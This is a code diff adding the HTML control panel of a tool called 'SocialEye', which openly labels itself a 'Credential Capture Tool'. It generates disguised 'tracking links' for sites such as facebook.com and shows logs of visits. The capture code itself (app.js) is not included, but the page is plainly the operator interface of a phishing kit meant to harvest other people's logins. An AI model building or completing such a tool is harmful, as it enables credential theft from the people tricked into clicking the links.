@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link Tracker - Credential Capture</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔗 SocialEye</h1>
+            <p class="subtitle">Credential Capture Tool</p>
+        </header>
+
+        <div class="main-content">
+            <div class="input-section">
+                <h2>Generate Tracking Link</h2>
+                <div class="input-group">
+                    <input type="text" id="originalUrl" placeholder="Enter any URL (e.g., facebook.com, google.com)" value="facebook.com">
+                    <button onclick="generateLink()" class="generate-btn">Generate Tracking Link</button>
+                </div>
+                <p class="hint">Press Enter or click the button to generate</p>
+                <input type="hidden" id="trackingId">
+            </div>
+
+            <div id="loading" class="loading" style="display: none;">
+                <div class="spinner"></div>
+                <p>Generating tracking link...</p>
+            </div>
+
+            <div id="errorMessage" class="error-message" style="display: none;"></div>
+            <div id="notification" class="notification" style="display: none;"></div>
+
+            <div id="trackingLink" class="tracking-link-container"></div>
+
+            <div class="controls">
+                <button onclick="refreshLogs()" class="refresh-btn">🔄 Refresh Logs</button>
+            </div>
+
+            <div id="visitLogs" class="visit-logs"></div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
